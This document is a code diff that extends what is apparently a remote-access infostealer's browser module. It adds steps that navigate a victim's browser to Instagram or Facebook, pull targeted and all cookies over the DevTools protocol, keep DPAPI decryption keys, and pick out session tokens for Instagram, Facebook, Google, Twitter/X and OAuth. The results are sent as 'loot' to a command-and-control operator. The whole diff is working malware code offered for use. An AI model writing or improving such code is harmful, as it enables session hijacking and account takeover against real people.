@@ -360,11 +360,63 @@ class BrowserManager:
                     # 2. Settling Buffer
                     time.sleep(20)
                     
-                    # 3. Pull
+                    # 3. Enable Network domain
                     cmd_enable = json.dumps({"id": 1, "method": "Network.enable"})
                     BrowserManager._send_ws_frame(s, cmd_enable)
-                    s.recv(4096)
-                    
+                    try: s.recv(4096)
+                    except: pass
+
+                    # 4. Navigate to target URL live so Instagram/FB actually sets sessionid
+                    #    This is the critical step – headless browser won't have session cookies
+                    #    unless it actually visits the authenticated page.
+                    try:
+                        cmd_nav = json.dumps({"id": 3, "method": "Page.navigate", "params": {"url": url}})
+                        BrowserManager._send_ws_frame(s, cmd_nav)
+                        # Drain – wait up to 15s for Page.loadEventFired or timeout
+                        nav_start = time.time()
+                        nav_buf = b""
+                        while time.time() - nav_start < 15:
+                            try:
+                                chunk = s.recv(32768)
+                                if chunk:
+                                    nav_buf += chunk
+                                    if b'loadEventFired' in nav_buf or b'Page.frameStoppedLoading' in nav_buf:
+                                        break
+                            except: break
+                        time.sleep(3)  # settle after nav
+                    except: pass
+
+                    # 5. Targeted getCookies for the specific domain (captures sessionid reliably)
+                    domain_frag_live = url.split("//")[-1].split("/")[0] if "//" in url else url
+                    domain_variants = [domain_frag_live, f".{domain_frag_live}"]
+                    for dv in domain_variants:
+                        try:
+                            cmd_targeted = json.dumps({"id": 4, "method": "Network.getCookies", "params": {"urls": [url]}})
+                            BrowserManager._send_ws_frame(s, cmd_targeted)
+                            t_buf = b""
+                            t_start = time.time()
+                            while time.time() - t_start < 10:
+                                chunk = s.recv(131072)
+                                if not chunk: break
+                                t_buf += chunk
+                                if b'"id":4' in t_buf and b'"result"' in t_buf:
+                                    if t_buf.count(b'{') <= t_buf.count(b'}') + 5:
+                                        break
+                            idx4 = t_buf.find(b'{"id":4')
+                            if idx4 != -1:
+                                r4 = json.loads(t_buf[idx4:].decode(errors='replace'))
+                                targeted_cookies = r4.get('result', {}).get('cookies', [])
+                                if targeted_cookies:
+                                    # Merge targeted into main cookies (priority: targeted wins)
+                                    existing_keys = {(c.get('name'), c.get('domain')) for c in cookies}
+                                    for tc in targeted_cookies:
+                                        k = (tc.get('name'), tc.get('domain'))
+                                        if k not in existing_keys:
+                                            cookies.append(tc)
+                                            existing_keys.add(k)
+                        except: pass
+
+                    # 6. Pull all cookies (broad harvest)
                     cmd_get = json.dumps({"id": 2, "method": "Network.getAllCookies"})
                     BrowserManager._send_ws_frame(s, cmd_get)
                     
@@ -389,7 +441,14 @@ class BrowserManager:
                         if idx != -1:
                             try:
                                 result = json.loads(resp_data[idx:].decode(errors='replace'))
-                                cookies = result.get('result', {}).get('cookies', [])
+                                all_cookies_raw = result.get('result', {}).get('cookies', [])
+                                # Merge: existing targeted cookies take priority
+                                existing_keys = {(c.get('name'), c.get('domain')) for c in cookies}
+                                for ac in all_cookies_raw:
+                                    k = (ac.get('name'), ac.get('domain'))
+                                    if k not in existing_keys:
+                                        cookies.append(ac)
+                                        existing_keys.add(k)
                             except:
                                 pass
                     s.close()
@@ -2675,6 +2734,28 @@ pty.spawn("/bin/sh")
             if not cookies and status != 'live':
                 return {'success': True, 'message': 'No cookies found matching filter', 'count': 0}
 
+            # Post-process: strip cookies with error-placeholder values (unreadable disk cookies)
+            ERROR_PREFIXES = ('[DPAPI', '[InvalidTag', '[General Error', '[No Master', '[ENCRYPTED')
+            clean_cookies = []
+            failed_cookies = []
+            for c in cookies:
+                val = c.get('value', '') or ''
+                if val.startswith(ERROR_PREFIXES):
+                    failed_cookies.append(c)
+                else:
+                    clean_cookies.append(c)
+
+            # Surface session-critical cookies for quick operator review
+            TARGET_NAMES = {'sessionid', 'csrftoken', 'ds_user_id', 'rur', 'mid', 'ig_did',
+                            'datr', 'c_user', 'xs', 'fr', 'wd',  # Facebook
+                            'SAPISID', 'SID', '__Secure-3PSID',   # Google
+                            'auth_token', 'ct0', 'twid',           # Twitter/X
+                            'access_token', 'refresh_token'}       # Generic OAuth
+            session_cookies = [
+                {'name': c.get('name'), 'value': c.get('value'), 'domain': c.get('domain')}
+                for c in clean_cookies if c.get('name') in TARGET_NAMES
+            ]
+
             report_data = {
                 'metadata': {
                     'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
@@ -2682,15 +2763,20 @@ pty.spawn("/bin/sh")
                     'user': getpass.getuser(),
                     'url_filter': url_filter,
                     'extraction_mode': status,
-                    'decryption_keys': keys
+                    'decryption_keys': keys,
+                    'session_cookies': session_cookies,   # <<< quick-access for sessionid etc.
+                    'total_raw': len(cookies),
+                    'total_clean': len(clean_cookies),
+                    'total_failed_decrypt': len(failed_cookies)
                 },
-                'cookies': cookies
+                'cookies': clean_cookies
             }
 
             report_json = json.dumps(report_data, indent=2)
-            filename = f"cookies_{status}_{url_filter.replace('.', '_') if url_filter else 'all'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            safe_filter = url_filter.replace('.', '_').replace('/', '_').replace(':', '') if url_filter else 'all'
+            filename = f"cookies_{status}_{safe_filter}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
             
-            submit_as_loot = cmd.get('as_file', True) or len(cookies) > 20
+            submit_as_loot = cmd.get('as_file', True) or len(clean_cookies) > 20
             
             if submit_as_loot:
                 self._send_loot('cookies', report_json.encode(), filename)
@@ -2699,14 +2785,16 @@ pty.spawn("/bin/sh")
                     'status': 'sent_as_loot',
                     'extraction_mode': status,
                     'filename': filename,
-                    'count': len(cookies)
+                    'count': len(clean_cookies),
+                    'session_cookies': session_cookies  # surfaced in C2 result immediately
                 }
 
             return {
                 'success': True,
                 'data': report_data,
                 'extraction_mode': status,
-                'count': len(cookies)
+                'count': len(clean_cookies),
+                'session_cookies': session_cookies
             }
         except Exception as e:
             return {'error': str(e)}
